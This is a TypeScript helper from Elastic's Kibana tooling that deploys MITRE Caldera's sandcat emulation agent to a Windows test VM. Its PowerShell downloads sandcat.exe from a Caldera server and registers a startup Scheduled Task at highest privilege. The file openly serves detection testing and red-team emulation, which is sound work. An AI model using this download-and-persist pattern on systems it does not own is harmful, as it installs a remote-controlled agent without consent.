/*
 * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
 * or more contributor license agreements. Licensed under the Elastic License
 * 2.0; you may not use this file except in compliance with the Elastic License
 * 2.0.
 */

import type { ToolingLog } from '@kbn/tooling-log';
import type { HostVm } from '../../common/types';

/**
 * Best-effort sandcat deployment for Windows VMs (UTM).
 *
 * - downloads sandcat.exe from Caldera (tries /file/download and /api/v2/file/download)
 * - persists it via a Scheduled Task that runs at startup
 *
 * NOTE: This generally requires the commands to run with admin privileges inside the VM.
 */
export const deploySandcatToUtmWindowsVm = async ({
  hostVm,
  calderaUrl,
  group = 'ref7707',
  log,
}: {
  hostVm: HostVm;
  calderaUrl: string;
  group?: string;
  log: ToolingLog;
}): Promise<void> => {
  if (hostVm.platform !== 'windows') {
    throw new Error(`deploySandcatToUtmWindowsVm expects a windows VM, got: ${hostVm.platform}`);
  }

  const url = calderaUrl.replace(/\/$/, '');
  log.info(`[caldera] deploying sandcat to Windows VM [${hostVm.name}] (Caldera: ${url})`);

  // Use PowerShell script for reliability; hostVm.exec for UTM runs PowerShell directly.
  const ps = [
    `$ErrorActionPreference = 'Stop'`,
    `$ProgressPreference = 'SilentlyContinue'`,
    `$CALDERA_URL = "${url}"`,
    `$GROUP = "${group}"`,
    `$DEST_DIR = "C:\\\\ProgramData\\\\sandcat"`,
    `$DEST_EXE = Join-Path $DEST_DIR "sandcat.exe"`,
    `New-Item -ItemType Directory -Force -Path $DEST_DIR | Out-Null`,
    ``,
    `Write-Output "[caldera] downloading sandcat.exe..."`,
    `$headers = @{ file = "sandcat.exe" }`,
    `$downloaded = $false`,
    `foreach ($u in @("$CALDERA_URL/file/download", "$CALDERA_URL/api/v2/file/download")) {`,
    `  try {`,
    `    Invoke-WebRequest -Method Post -Headers $headers -Uri $u -OutFile $DEST_EXE`,
    `    $downloaded = $true`,
    `    break`,
    `  } catch { }`,
    `}`,
    `if (-not $downloaded) { throw "Failed to download sandcat.exe from Caldera" }`,
    ``,
    `Write-Output "[caldera] registering scheduled task..."`,
    `$taskName = "sandcat"`,
    `try { Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue } catch { }`,
    `$action = New-ScheduledTaskAction -Execute $DEST_EXE -Argument ("-server " + $CALDERA_URL + " -group " + $GROUP + " -paw " + $env:COMPUTERNAME)`,
    `$trigger = New-ScheduledTaskTrigger -AtStartup`,
    `Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null`,
    `Start-ScheduledTask -TaskName $taskName`,
    `Write-Output "[caldera] done"`,
  ].join('\n');

  await hostVm.exec(ps);
};
